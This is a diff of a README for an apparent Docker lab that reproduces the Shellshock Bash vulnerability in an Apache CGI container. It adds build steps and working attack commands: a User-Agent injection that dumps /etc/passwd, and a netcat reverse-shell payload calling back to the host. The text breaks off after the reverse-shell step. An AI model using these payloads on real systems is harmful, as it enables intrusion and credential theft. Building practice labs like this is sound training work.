@@ -1,33 +1,38 @@
 
 # Shellshock
 
-CentOS8 + Apache2 + Bash (v4.3)
+CentOS8 + Apache2 + Bash (v4.3) based on https://github.com/tex2e/docker-shellshock-cgi
+
+Requirements:
+- Docker
+- git
+- netcat command
 
 ### Build
-Build an image from Dockerfile:
-```bash
-docker build -t tex2e/shellshock-cgi .
-docker run -itd -p 80:80 --privileged --name shellshock-cgi tex2e/shellshock-cgi /sbin/init
-```
-When entering the container:
-```bash
-docker exec -it shellshock-cgi bash
-```
-- The bash containing the vulnerability is located in /usr/local/bin/bash.
-- Shebang in /var/www/cgi-bin/test.cgi specifies to run /usr/local/bin/bash.
+1. command: $git clone https://github.com/juuugee/docker-shellshock-cgi.git
+2. navigate to the git directory
+3. command: $docker build -t seccode/shellshock <**absolute Path to the directory**>
+4. command: $docker run -itd -p 80:80 --privileged --add-host=host.docker.internal:host-gateway --name secode_shellshock seccode/shellshock /sbin/init
 
-### Attack
-
+### Attack (Linux terminal preferred)
+Get the Information out of **etc/passwd** <br>
 curl：
 ```bash
 curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
 ```
-
-PowerShell：
-```powershell
-$Response = Invoke-WebRequest -UserAgent "() { :;}; echo `"Content-type: text/plain`"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
-$Response.Content
+#
+Create a Reverse Shell 2 Terminals required <br>
+1. Terminal (Start nc Listener):
 ```
+nc -lp 4545
+```
+2. Terminal (Establish a connection via Shellshock vulnerability):
+```
+curl -A "() { :;}; /bin/bash -c \"nc host.docker.internal 4545 -e /bin/bash\"& " http://localhost:80/cgi-bin/test.cgi
+```
+
+Go to the first terminal and use the **reverse shell**: </br>
+For example, read the rights of the shell:  
 
 ### See Also
 
